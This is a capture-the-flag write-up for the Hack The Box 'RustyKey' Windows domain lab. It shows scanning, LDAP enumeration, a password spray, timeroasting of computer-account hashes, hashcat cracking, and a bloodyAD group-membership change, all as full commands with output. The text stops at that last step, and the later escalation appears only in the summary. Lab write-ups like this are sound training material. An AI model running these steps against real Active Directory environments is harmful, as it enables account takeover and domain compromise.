---
title: 🗝️ HTB RustyKey Write-up
name: RustyKey
date: 2025-11-08
last_modified_at: 2025-11-08
difficulty: Hard
os: Windows
skills: Enumeration, Time Roasting, ACE Abuse, Kerberos, Password Cracking, DLL Hijacking, Reverse Shell, RBCD, Privilege Escalation
tools: rustscan, nmap, nxc, BloodHound, timeroast.py, hashcat, bloodyAD, impacket-getTGT, klist, evil-winrm, msfvenom, PowerView, Rubeus, RunasCs, nc
published: true
---

![](images/Pasted%20image%2020250810180818.png)

```
Machine Information

As is common in real life Windows pentests, you will start the RustyKey box with credentials for the following account: rr.parker / 8#t5HE8L!W3A
```

## 🗂️ Summary

During the assessment, I began by performing **timeroasting** against the `rustykey.htb` SNTP service. This technique yielded hashes for several computer accounts, including `IT-Backup3$`, whose hash was cracked within seconds. Using this, I requested a Kerberos TGT for the computer account and gained access to the target server.

Next, **Access Control Entry (ACE)** abuse enabled privilege escalation to user `bb.morgan`, along with Remote Management access to `dc.rustykey.htb`. On `bb.morgan`’s Desktop, I found a revealing memo noting that the `Support` group had been granted extra permissions to modify the context menu of an archiving tool.

That archiving tool was `7-zip`, and user `ee.reed` (a member of `Support`) could alter the registry keys controlling its context menu. This was exploited to hijack a DLL and load a malicious payload, resulting in a reverse shell as user `mm.turner`.

Finally, `mm.turner` leveraged **Resource-Based Constrained Delegation (RBCD)** on the `DC$` account. By delegating `IT-Backup3$` to impersonate any user on `DC$`, I successfully impersonated the Enterprise Administrator `BACKUPADMIN`, culminating in full domain compromise.

## 🕰️ Hacking Time

### 🔎 Recon

**Initial scan** revealed open ports:
- `53/tcp`, `88/tcp`, `135/tcp`, `139/tcp`, `389/tcp`, `445/tcp`, `464/tcp`, `593/tcp`, `636/tcp`, `3268/tcp`, `3260/tcp`, `9389/tcp` : Microsoft Active Directory Server.
- `5985/tcp`: Microsoft Windows Remote Management.

```
fcoomans@kali:~/htb/rustykey$ rustscan -a 10.10.11.75 --tries 5 --ulimit 10000 -- -sCV -oA rustykey_tcp_all
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Scanning ports: The virtual equivalent of knocking on doors.

[~] The config file is expected to be at "/home/fcoomans/.rustscan.toml"
[~] Automatically increasing ulimit value to 10000.
Open 10.10.11.75:53
Open 10.10.11.75:88
Open 10.10.11.75:135
Open 10.10.11.75:139
Open 10.10.11.75:389
Open 10.10.11.75:445
Open 10.10.11.75:464
Open 10.10.11.75:593
Open 10.10.11.75:636
Open 10.10.11.75:3268
Open 10.10.11.75:3269
Open 10.10.11.75:5985
Open 10.10.11.75:9389
Open 10.10.11.75:47001
Open 10.10.11.75:49664
Open 10.10.11.75:49665
Open 10.10.11.75:49666
Open 10.10.11.75:49667
Open 10.10.11.75:49672
Open 10.10.11.75:49674
Open 10.10.11.75:49675
Open 10.10.11.75:49677
Open 10.10.11.75:49678
Open 10.10.11.75:49681
Open 10.10.11.75:49696
Open 10.10.11.75:49736
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} -{{ipversion}} {{ip}} -sCV -oA rustykey_tcp_all" on ip 10.10.11.75
Depending on the complexity of the script, results may take some time to appear.

<SNIP>

Nmap scan report for rustykey.htb (10.10.11.75)
Host is up, received reset ttl 127 (0.16s latency).
Scanned at 2025-08-06 11:17:20 SAST for 77s

PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-08-06 13:08:15Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: rustykey.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 127
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: rustykey.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 127
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
47001/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49666/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49672/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49674/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49675/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49677/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49678/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49681/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49696/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49736/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

<SNIP>
```

After pointing `rustykey.htb` in `/etc/hosts`,

```
fcoomans@kali:~/htb/rustykey$ grep rustykey.htb /etc/hosts
10.10.11.75     rustykey.htb
```

I run a UDP port scan and find these open ports:
- `53/udp`, `88/udp`: Microsoft Active Directory Server DNS and Kerberos.
- `123/udp`: Microsoft Simple Network Time Protocol.

```
fcoomans@kali:~/htb/rustykey$ nmap --top-ports 100 --open -sU dc.rustykey.htb
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-06 15:12 SAST
Nmap scan report for dc.rustykey.htb (10.10.11.75)
Host is up (0.22s latency).
Not shown: 81 closed udp ports (port-unreach)
PORT      STATE         SERVICE
9/udp     open|filtered discard
53/udp    open          domain
88/udp    open          kerberos-sec
111/udp   open|filtered rpcbind
123/udp   open          ntp
135/udp   open|filtered msrpc
137/udp   open|filtered netbios-ns
138/udp   open|filtered netbios-dgm
500/udp   open|filtered isakmp
1026/udp  open|filtered win-rpc
1029/udp  open|filtered solid-mux
2000/udp  open|filtered cisco-sccp
3283/udp  open|filtered netassistant
4500/udp  open|filtered nat-t-ike
5353/udp  open|filtered zeroconf
33281/udp open|filtered unknown
49152/udp open|filtered unknown
49156/udp open|filtered unknown
49181/udp open|filtered unknown

Nmap done: 1 IP address (1 host up) scanned in 106.59 seconds
```

Port `123/udp` allows me to sync my attack host time with the Windows Server.  This is important because Kerberos tickets are time sensitive.  Whenever I get a clock skew error, I rerun the command below to sync time with the server.

```
fcoomans@kali:~/htb/rustykey$ sudo ntpdate rustykey.htb
2025-08-06 15:11:24.929222 (+0200) +13867.358868 +/- 0.079574 rustykey.htb 10.10.11.75 s1 no-leap
CLOCK: time stepped by 13867.358868
```

`nxc` shows that the domain controller is named `dc.rustykey.htb`.

```
fcoomans@kali:~/htb/rustykey$ nxc ldap rustykey.htb --dns-server 10.10.11.75 -u rr.parker -p '8#t5HE8L!W3A' -k --dc-list
LDAP        rustykey.htb    389    DC               [*] None (name:DC) (domain:rustykey.htb)
LDAP        rustykey.htb    389    DC               [+] rustykey.htb\rr.parker:8#t5HE8L!W3A
LDAP        rustykey.htb    389    DC               dc.rustykey.htb = 10.10.11.75
```

After pointing to `dc.rustykey.htb` in `/etc/hosts`,

```
fcoomans@kali:~/htb/rustykey$ grep rustykey.htb /etc/hosts
10.10.11.75     dc.rustykey.htb rustykey.htb
```

`/etc/krb5.conf` is updated with the `rustykey.htb` domain information for Kerberos functions.

```
fcoomans@kali:~/htb/rustykey$ cat /etc/krb5.conf
[libdefaults]
        default_realm = RUSTYKEY.HTB

# The following krb5.conf variables are only for MIT Kerberos.
        kdc_timesync = 1
        ccache_type = 4
        forwardable = true
        proxiable = true
        rdns = false


# The following libdefaults parameters are only for Heimdal Kerberos.
        fcc-mit-ticketflags = true

[realms]
        ​RUSTYKEY.HTB = {
                kdc = DC.rustykey.htb
                admin_server = DC.rustykey.htb
                default_domain = rustykey.htb
        }

[domain_realm]
        .rustykey = RUSTYKEY.HTB
        rustykey = RUSTYKEY.HTB
```

I use `nxc` as a BloodHound collector and ingest the results into BloodHound.

```
fcoomans@kali:~/htb/rustykey$ nxc ldap dc.rustykey.htb --dns-server 10.10.11.75 -u rr.parker -p '8#t5HE8L!W3A' -k --bloodhound -c All
LDAP        dc.rustykey.htb 389    DC               [*] None (name:DC) (domain:rustykey.htb)
LDAP        dc.rustykey.htb 389    DC               [+] rustykey.htb\rr.parker:8#t5HE8L!W3A
LDAP        dc.rustykey.htb 389    DC               Resolved collection methods: psremote, acl, localadmin, session, rdp, trusts, group, dcom, objectprops, container
LDAP        dc.rustykey.htb 389    DC               Using kerberos auth without ccache, getting TGT
LDAP        dc.rustykey.htb 389    DC               Done in 00M 35S
LDAP        dc.rustykey.htb 389    DC               Compressing output into /home/fcoomans/.nxc/logs/DC_dc.rustykey.htb_2025-08-06_164550_bloodhound.zip

fcoomans@kali:~/htb/rustykey$ mv ~/.nxc/logs/DC_dc.rustykey.htb_2025-08-06_164550_bloodhound.zip .
```

`nxc` is then used to export the domain users to a file.

```
fcoomans@kali:~/htb/rustykey$ nxc ldap dc.rustykey.htb -u rr.parker -p '8#t5HE8L!W3A' -k --users-export domain_users.txt
LDAP        dc.rustykey.htb 389    DC               [*] None (name:DC) (domain:rustykey.htb)
LDAP        dc.rustykey.htb 389    DC               [+] rustykey.htb\rr.parker:8#t5HE8L!W3A
LDAP        dc.rustykey.htb 389    DC               [*] Enumerated 11 domain users: rustykey.htb
LDAP        dc.rustykey.htb 389    DC               -Username-                    -Last PW Set-       -BadPW-  -Description-
LDAP        dc.rustykey.htb 389    DC               Administrator                 2025-06-05 00:52:22 0        Built-in account for administering the computer/domain
LDAP        dc.rustykey.htb 389    DC               Guest                         <never>             0        Built-in account for guest access to the computer/domain
LDAP        dc.rustykey.htb 389    DC               krbtgt                        2024-12-27 02:53:40 0        Key Distribution Center Service Account
LDAP        dc.rustykey.htb 389    DC               rr.parker                     2025-06-05 00:54:15 0
LDAP        dc.rustykey.htb 389    DC               mm.turner                     2024-12-27 12:18:39 0
LDAP        dc.rustykey.htb 389    DC               bb.morgan                     2025-08-06 15:31:40 0
LDAP        dc.rustykey.htb 389    DC               gg.anderson                   2025-08-06 15:31:40 0
LDAP        dc.rustykey.htb 389    DC               dd.ali                        2025-08-06 15:31:40 0
LDAP        dc.rustykey.htb 389    DC               ee.reed                       2025-08-06 15:31:40 0
LDAP        dc.rustykey.htb 389    DC               nn.marcos                     2024-12-27 13:34:50 0
LDAP        dc.rustykey.htb 389    DC               backupadmin                   2024-12-30 02:30:18 0
LDAP        dc.rustykey.htb 389    DC               [*] Writing 11 local users to domain_users.txt

fcoomans@kali:~/htb/rustykey$ cat domain_users.txt
Administrator
Guest
krbtgt
rr.parker
mm.turner
bb.morgan
gg.anderson
dd.ali
ee.reed
nn.marcos
backupadmin
```

The groups are enumerated,

```
fcoomans@kali:~/htb/rustykey$ nxc ldap dc.rustykey.htb -u rr.parker -p '8#t5HE8L!W3A' -k --groups |grep -v "membercount: 0"
LDAP                     dc.rustykey.htb 389    DC               [*] None (name:DC) (domain:rustykey.htb)
LDAP                     dc.rustykey.htb 389    DC               [+] rustykey.htb\rr.parker:8#t5HE8L!W3A
LDAP                     dc.rustykey.htb 389    DC               Administrators                           membercount: 3
LDAP                     dc.rustykey.htb 389    DC               Users                                    membercount: 3
LDAP                     dc.rustykey.htb 389    DC               Guests                                   membercount: 2
LDAP                     dc.rustykey.htb 389    DC               IIS_IUSRS                                membercount: 1
LDAP                     dc.rustykey.htb 389    DC               Remote Management Users                  membercount: 2
LDAP                     dc.rustykey.htb 389    DC               Schema Admins                            membercount: 1
LDAP                     dc.rustykey.htb 389    DC               Enterprise Admins                        membercount: 2
LDAP                     dc.rustykey.htb 389    DC               Domain Admins                            membercount: 1
LDAP                     dc.rustykey.htb 389    DC               Group Policy Creator Owners              membercount: 1
LDAP                     dc.rustykey.htb 389    DC               Pre-Windows 2000 Compatible Access       membercount: 1
LDAP                     dc.rustykey.htb 389    DC               Windows Authorization Access Group       membercount: 1
LDAP                     dc.rustykey.htb 389    DC               Denied RODC Password Replication Group   membercount: 8
LDAP                     dc.rustykey.htb 389    DC               Protected Users                          membercount: 1
LDAP                     dc.rustykey.htb 389    DC               HelpDesk                                 membercount: 1
LDAP                     dc.rustykey.htb 389    DC               Protected Objects                        membercount: 2
LDAP                     dc.rustykey.htb 389    DC               IT                                       membercount: 2
LDAP                     dc.rustykey.htb 389    DC               Support                                  membercount: 1
LDAP                     dc.rustykey.htb 389    DC               Finance                                  membercount: 1
LDAP                     dc.rustykey.htb 389    DC               DelegationManager                        membercount: 1
```

And interesting group membership is noted.

```
fcoomans@kali:~/htb/rustykey$ nxc ldap dc.rustykey.htb -u rr.parker -p '8#t5HE8L!W3A' -k --groups Administrators
LDAP        dc.rustykey.htb 389    DC               [*] None (name:DC) (domain:rustykey.htb)
LDAP        dc.rustykey.htb 389    DC               [+] rustykey.htb\rr.parker:8#t5HE8L!W3A
LDAP        dc.rustykey.htb 389    DC               Domain Admins
LDAP        dc.rustykey.htb 389    DC               Enterprise Admins
LDAP        dc.rustykey.htb 389    DC               Administrator

fcoomans@kali:~/htb/rustykey$ nxc ldap dc.rustykey.htb -u rr.parker -p '8#t5HE8L!W3A' -k --groups "Remote Management Users"
LDAP        dc.rustykey.htb 389    DC               [*] None (name:DC) (domain:rustykey.htb)
LDAP        dc.rustykey.htb 389    DC               [+] rustykey.htb\rr.parker:8#t5HE8L!W3A
LDAP        dc.rustykey.htb 389    DC               Support
LDAP        dc.rustykey.htb 389    DC               IT

fcoomans@kali:~/htb/rustykey$ nxc ldap dc.rustykey.htb -u rr.parker -p '8#t5HE8L!W3A' -k --groups "Protected Users"
LDAP        dc.rustykey.htb 389    DC               [*] None (name:DC) (domain:rustykey.htb)
LDAP        dc.rustykey.htb 389    DC               [+] rustykey.htb\rr.parker:8#t5HE8L!W3A
LDAP        dc.rustykey.htb 389    DC               Protected Objects

fcoomans@kali:~/htb/rustykey$ nxc ldap dc.rustykey.htb -u rr.parker -p '8#t5HE8L!W3A' -k --groups "HelpDesk"
LDAP        dc.rustykey.htb 389    DC               [*] None (name:DC) (domain:rustykey.htb)
LDAP        dc.rustykey.htb 389    DC               [+] rustykey.htb\rr.parker:8#t5HE8L!W3A
LDAP        dc.rustykey.htb 389    DC               nn.marcos

fcoomans@kali:~/htb/rustykey$ nxc ldap dc.rustykey.htb -u rr.parker -p '8#t5HE8L!W3A' -k --groups "Protected Objects"
LDAP        dc.rustykey.htb 389    DC               [*] None (name:DC) (domain:rustykey.htb)
LDAP        dc.rustykey.htb 389    DC               [+] rustykey.htb\rr.parker:8#t5HE8L!W3A
LDAP        dc.rustykey.htb 389    DC               Support
LDAP        dc.rustykey.htb 389    DC               IT

fcoomans@kali:~/htb/rustykey$ nxc ldap dc.rustykey.htb -u rr.parker -p '8#t5HE8L!W3A' -k --groups "IT"
LDAP        dc.rustykey.htb 389    DC               [*] None (name:DC) (domain:rustykey.htb)
LDAP        dc.rustykey.htb 389    DC               [+] rustykey.htb\rr.parker:8#t5HE8L!W3A
LDAP        dc.rustykey.htb 389    DC               gg.anderson
LDAP        dc.rustykey.htb 389    DC               bb.morgan

fcoomans@kali:~/htb/rustykey$ nxc ldap dc.rustykey.htb -u rr.parker -p '8#t5HE8L!W3A' -k --groups "Support"
LDAP        dc.rustykey.htb 389    DC               [*] None (name:DC) (domain:rustykey.htb)
LDAP        dc.rustykey.htb 389    DC               [+] rustykey.htb\rr.parker:8#t5HE8L!W3A
LDAP        dc.rustykey.htb 389    DC               ee.reed

fcoomans@kali:~/htb/rustykey$ nxc ldap dc.rustykey.htb -u rr.parker -p '8#t5HE8L!W3A' -k --groups "Finance"
LDAP        dc.rustykey.htb 389    DC               [*] None (name:DC) (domain:rustykey.htb)
LDAP        dc.rustykey.htb 389    DC               [+] rustykey.htb\rr.parker:8#t5HE8L!W3A
LDAP        dc.rustykey.htb 389    DC               dd.ali

fcoomans@kali:~/htb/rustykey$ nxc ldap dc.rustykey.htb -u rr.parker -p '8#t5HE8L!W3A' -k --groups "DelegationManager"
LDAP        dc.rustykey.htb 389    DC               [*] None (name:DC) (domain:rustykey.htb)
LDAP        dc.rustykey.htb 389    DC               [+] rustykey.htb\rr.parker:8#t5HE8L!W3A
LDAP        dc.rustykey.htb 389    DC               mm.turner
```

I attempt a password spray with `rr.parker` password, but no other accounts use this password.

```
fcoomans@kali:~/htb/rustykey$ nxc ldap dc.rustykey.htb -u domain_users.txt -p '8#t5HE8L!W3A' -k --continue-on-success
LDAP        dc.rustykey.htb 389    DC               [*] None (name:DC) (domain:rustykey.htb)
LDAP        dc.rustykey.htb 389    DC               [-] rustykey.htb\Administrator:8#t5HE8L!W3A KDC_ERR_PREAUTH_FAILED
LDAP        dc.rustykey.htb 389    DC               [-] rustykey.htb\Guest:8#t5HE8L!W3A KDC_ERR_CLIENT_REVOKED
LDAP        dc.rustykey.htb 389    DC               [-] rustykey.htb\krbtgt:8#t5HE8L!W3A KDC_ERR_CLIENT_REVOKED
LDAP        dc.rustykey.htb 389    DC               [+] rustykey.htb\rr.parker:8#t5HE8L!W3A
LDAP        dc.rustykey.htb 389    DC               [-] rustykey.htb\mm.turner:8#t5HE8L!W3A KDC_ERR_PREAUTH_FAILED
LDAP        dc.rustykey.htb 389    DC               [-] rustykey.htb\bb.morgan:8#t5HE8L!W3A KDC_ERR_ETYPE_NOSUPP
LDAP        dc.rustykey.htb 389    DC               [-] rustykey.htb\gg.anderson:8#t5HE8L!W3A KDC_ERR_CLIENT_REVOKED
LDAP        dc.rustykey.htb 389    DC               [-] rustykey.htb\dd.ali:8#t5HE8L!W3A KDC_ERR_PREAUTH_FAILED
LDAP        dc.rustykey.htb 389    DC               [-] rustykey.htb\ee.reed:8#t5HE8L!W3A KDC_ERR_ETYPE_NOSUPP
LDAP        dc.rustykey.htb 389    DC               [-] rustykey.htb\nn.marcos:8#t5HE8L!W3A KDC_ERR_PREAUTH_FAILED
LDAP        dc.rustykey.htb 389    DC               [-] rustykey.htb\backupadmin:8#t5HE8L!W3A KDC_ERR_PREAUTH_FAILED
```

No files were found on the shares on the server.  BloodHound showed that no accounts could be Kerberoasted or ASREPRoasted.

The only other attack vector to investigate is Timeroasting, which is a new attack vector that takes advantage of Windows SNTP (`123/udp`) authentication to request the hashes of computer accounts.
Disclosing these hashes is generally not a problem, as they are randomly generated.  If a computer password is reset to a weak password, then the hash can be cracked offline.

For more on this, see https://www.secura.com/uploads/whitepapers/Secura-WP-Timeroasting-v3.pdf

### 🧪 Exploitation

#### 🕰️🔥 Time Roasting

A proof of concept for timeroasting is found at https://github.com/SecuraBV/Timeroast.
The repo is cloned.

```
fcoomans@kali:~/htb/rustykey$ git clone https://github.com/SecuraBV/Timeroast
Cloning into 'Timeroast'...
remote: Enumerating objects: 91, done.
remote: Counting objects: 100% (91/91), done.
remote: Compressing objects: 100% (54/54), done.
remote: Total 91 (delta 46), reused 73 (delta 35), pack-reused 0 (from 0)
Receiving objects: 100% (91/91), 246.55 KiB | 15.41 MiB/s, done.
Resolving deltas: 100% (46/46), done.

fcoomans@kali:~/htb/rustykey$ cd Timeroast
```

And run, which requests the computer hashes.

```
fcoomans@kali:~/htb/rustykey/Timeroast$ python timeroast.py dc.rustykey.htb
1000:$sntp-ms$288e0b295a4957243fc7604bd1509892$1c0111e900000000000a76a34c4f434cec3f140775d70387e1b8428bffbfcd0aec3fb06fd9ef573bec3fb06fd9efb6dc
1103:$sntp-ms$50929f5ebd36da882471d7b696248a48$1c0111e900000000000a76a34c4f434cec3f140776a0c0d5e1b8428bffbfcd0aec3fb0708a984937ec3fb0708a98b2e9
1104:$sntp-ms$ed341518162ac51bc6476bbbc1c11b69$1c0111e900000000000a76a34c4f434cec3f1407784f3196e1b8428bffbfcd0aec3fb0708c46ce1aec3fb0708c47199a
1105:$sntp-ms$6d3eec2560010442fcc34ec7387ef49e$1c0111e900000000000a76a34c4f434cec3f140775e4de3be1b8428bffbfcd0aec3fb0708df50c86ec3fb0708df55ebc
1106:$sntp-ms$0865a21f6af34bdf134a310af0c815c8$1c0111e900000000000a76a34c4f434cec3f1407779ccaa6e1b8428bffbfcd0aec3fb0708faced33ec3fb0708fad4cd4
1107:$sntp-ms$b7744d1b3d5578f869ad280f989d6ebf$1c0111e900000000000a76a34c4f434cec3f140775420b3de1b8428bffbfcd0aec3fb070916acb4fec3fb070916b187c
1118:$sntp-ms$ceb34e2d9ea13e204eb5f64489280f2c$1c0111e900000000000a76a34c4f434cec3f1407783542d7e1b8428bffbfcd0aec3fb070a43d3ffcec3fb070a43d8b7b
1119:$sntp-ms$6e909a63e04ad90e8f7f2b23a6d1011e$1c0111e900000000000a76a34c4f434cec3f140775ca3542e1b8428bffbfcd0aec3fb070a5eac789ec3fb070a5eb14b6
1120:$sntp-ms$6fdd189140420d9652a398577cf273cd$1c0111e900000000000a76a34c4f434cec3f1407778041d9e1b8428bffbfcd0aec3fb070a7a0cd6aec3fb070a7a11f9f
1121:$sntp-ms$111df8f0ab4c52f5ec33720b7f03a75b$1c0111e900000000000a76a34c4f434cec3f14077551f4bfe1b8428bffbfcd0aec3fb070a949949eec3fb070a949de70
1122:$sntp-ms$126193c195c8d2e9d0c69a0102c0f243$1c0111e900000000000a76a34c4f434cec3f140776fb960de1b8428bffbfcd0aec3fb070aaf33af5ec3fb070aaf37c63
1123:$sntp-ms$92a34c242e1167705c69aa541a860ed0$1c0111e900000000000a76a44c4f434cec3f1407749ab954e1b8428bffbfcd0aec3fb070acaaee55ec3fb070acab331f
1124:$sntp-ms$b110d9a3a11312ae064fde24a3282f7b$1c0111e900000000000a76a44c4f434cec3f140776ae5365e1b8428bffbfcd0aec3fb070aebe7e55ec3fb070aebeda9b
1125:$sntp-ms$78ef11ac3d935277136b0ea8822476aa$1c0111e900000000000a76a44c4f434cec3f1407781db51ce1b8428bffbfcd0aec3fb070b02de6c3ec3fb070b02e2ee7
1126:$sntp-ms$23cf9afb26128821ea3be5d16a8a8354$1c0111e900000000000a76a44c4f434cec3f140775b59578e1b8428bffbfcd0aec3fb070b1de558bec3fb070b1dea613
1127:$sntp-ms$e889ea640b48d06cbcc5edf06ab9cf34$1c0111e900000000000a76a44c4f434cec3f140777639e35e1b8428bffbfcd0aec3fb070b38c64fdec3fb070b38cad22
```

The repo includes an `extra-scripts/timecrack.py` script to crack the hashes, but this script doesn't handle Unicode properly and is not optimised.
Luckily, the recently released `hashcat v7.0.0` is now able to crack the hashes.  This version of `hashcat` is installed on my host Windows computer.

I cleaned up the output from the timeroast to only contain the hashes and added it to the `timeroast.hashes` file.

```
PS C:\hashcat> gc .\hashes\timeroast.hashes
$sntp-ms$288e0b295a4957243fc7604bd1509892$1c0111e900000000000a76a34c4f434cec3f140775d70387e1b8428bffbfcd0aec3fb06fd9ef573bec3fb06fd9efb6dc
$sntp-ms$50929f5ebd36da882471d7b696248a48$1c0111e900000000000a76a34c4f434cec3f140776a0c0d5e1b8428bffbfcd0aec3fb0708a984937ec3fb0708a98b2e9
$sntp-ms$ed341518162ac51bc6476bbbc1c11b69$1c0111e900000000000a76a34c4f434cec3f1407784f3196e1b8428bffbfcd0aec3fb0708c46ce1aec3fb0708c47199a
$sntp-ms$6d3eec2560010442fcc34ec7387ef49e$1c0111e900000000000a76a34c4f434cec3f140775e4de3be1b8428bffbfcd0aec3fb0708df50c86ec3fb0708df55ebc
$sntp-ms$0865a21f6af34bdf134a310af0c815c8$1c0111e900000000000a76a34c4f434cec3f1407779ccaa6e1b8428bffbfcd0aec3fb0708faced33ec3fb0708fad4cd4
$sntp-ms$b7744d1b3d5578f869ad280f989d6ebf$1c0111e900000000000a76a34c4f434cec3f140775420b3de1b8428bffbfcd0aec3fb070916acb4fec3fb070916b187c
$sntp-ms$ceb34e2d9ea13e204eb5f64489280f2c$1c0111e900000000000a76a34c4f434cec3f1407783542d7e1b8428bffbfcd0aec3fb070a43d3ffcec3fb070a43d8b7b
$sntp-ms$6e909a63e04ad90e8f7f2b23a6d1011e$1c0111e900000000000a76a34c4f434cec3f140775ca3542e1b8428bffbfcd0aec3fb070a5eac789ec3fb070a5eb14b6
$sntp-ms$6fdd189140420d9652a398577cf273cd$1c0111e900000000000a76a34c4f434cec3f1407778041d9e1b8428bffbfcd0aec3fb070a7a0cd6aec3fb070a7a11f9f
$sntp-ms$111df8f0ab4c52f5ec33720b7f03a75b$1c0111e900000000000a76a34c4f434cec3f14077551f4bfe1b8428bffbfcd0aec3fb070a949949eec3fb070a949de70
$sntp-ms$126193c195c8d2e9d0c69a0102c0f243$1c0111e900000000000a76a34c4f434cec3f140776fb960de1b8428bffbfcd0aec3fb070aaf33af5ec3fb070aaf37c63
$sntp-ms$92a34c242e1167705c69aa541a860ed0$1c0111e900000000000a76a44c4f434cec3f1407749ab954e1b8428bffbfcd0aec3fb070acaaee55ec3fb070acab331f
$sntp-ms$b110d9a3a11312ae064fde24a3282f7b$1c0111e900000000000a76a44c4f434cec3f140776ae5365e1b8428bffbfcd0aec3fb070aebe7e55ec3fb070aebeda9b
$sntp-ms$78ef11ac3d935277136b0ea8822476aa$1c0111e900000000000a76a44c4f434cec3f1407781db51ce1b8428bffbfcd0aec3fb070b02de6c3ec3fb070b02e2ee7
$sntp-ms$23cf9afb26128821ea3be5d16a8a8354$1c0111e900000000000a76a44c4f434cec3f140775b59578e1b8428bffbfcd0aec3fb070b1de558bec3fb070b1dea613
$sntp-ms$e889ea640b48d06cbcc5edf06ab9cf34$1c0111e900000000000a76a44c4f434cec3f140777639e35e1b8428bffbfcd0aec3fb070b38c64fdec3fb070b38cad22
```

`hashcat v7.0.0` is then used to crack the hashes using the `rockyou.txt` wordlist.  One of the hashes is cracked in 3 seconds!

```
PS C:\hashcat> .\hashcat.exe -m 31300 .\hashes\timeroast.hashes .\wordlists\rockyou.txt
hashcat (v7.0.0) starting

<SNIP>

$sntp-ms$78ef11ac3d935277136b0ea8822476aa$1c0111e900000000000a76a44c4f434cec3f1407781db51ce1b8428bffbfcd0aec3fb070b02de6c3ec3fb070b02e2ee7:Rusty88!
Approaching final keyspace - workload adjusted.


Session..........: hashcat
Status...........: Exhausted
Hash.Mode........: 31300 (MS SNTP)
Hash.Target......: .\hashes\timeroast.hashes
Time.Started.....: Thu Aug 07 18:42:14 2025 (3 secs)
Time.Estimated...: Thu Aug 07 18:42:17 2025 (0 secs)
```

The hash belongs to the computer with RID `1125`.

```
1125:$sntp-ms$78ef11ac3d935277136b0ea8822476aa$1c0111e900000000000a76a44c4f434cec3f1407781db51ce1b8428bffbfcd0aec3fb070b02de6c3ec3fb070b02e2ee7
```

The cracked password is `Rusty88!`.

```
$sntp-ms$78ef11ac3d935277136b0ea8822476aa$1c0111e900000000000a76a44c4f434cec3f1407781db51ce1b8428bffbfcd0aec3fb070b02de6c3ec3fb070b02e2ee7:Rusty88!
```

### 💰 Post Exploitation

#### 🔼 PrivEsc to IT-Computer3$

BloodHound shows that this RID belongs to the computer `IT-Computer3$`.

![](images/Pasted%20image%2020250809085128.png)

`nxc` confirmed that the password is indeed correct.

```
fcoomans@kali:~/htb/rustykey$ nxc ldap dc.rustykey.htb -u IT-Computer3$ -p Rusty88! -k
LDAP        dc.rustykey.htb 389    DC               [*] None (name:DC) (domain:rustykey.htb)
LDAP        dc.rustykey.htb 389    DC               [+] rustykey.htb\IT-Computer3$:Rusty88!
```

## 🤖 A Computer is also a "user", right?

### 🔎 Recon

Keep in mind that computers authenticate with the server like a user would.  The computer account can be used like any other user account.

BloodHound also shows that `IT-Computer3` can add itself to the `HelpDesk` group.  Membership in the `HelpDesk` group allows the computer account to change the passwords for some users.

![](images/Pasted%20image%2020250809091446.png)

Three of these users are `Remote Management Users`.

![](images/Pasted%20image%2020250809093809.png)

BloodHound suggested how to add `IT-Computer3` to the `HelpDesk` group using `net`.

![](images/Pasted%20image%2020250809091606.png)

I prefer to use `bloodyAD` instead for AD interactions and add the computer to the `HelpDesk` group.

```
fcoomans@kali:~/htb/rustykey$ bloodyAD --host dc.rustykey.htb -d rustykey.htb -u IT-Computer3$ -p Rusty88! -k add groupMember HELPDESK IT-Computer3$
[+] IT-Computer3$ added to HELPDESK

fcoomans@kali:~/htb/rustykey$ bloodyAD --host dc.rustykey.htb -d rustykey.htb -u IT-Computer3$ -p Rusty88! -k get membership IT-Computer3$

distinguishedName: CN=Domain Computers,CN=Users,DC=rustykey,DC=htb
objectSid: S-1-5-21-3316070415-896458127-4139322052-515
sAMAccountName: Domain Computers

distinguishedName: CN=HelpDesk,CN=Users,DC=rustykey,DC=htb
objectSid: S-1-5-21-3316070415-896458127-4139322052-1128
sAMAccountName: HelpDesk
```

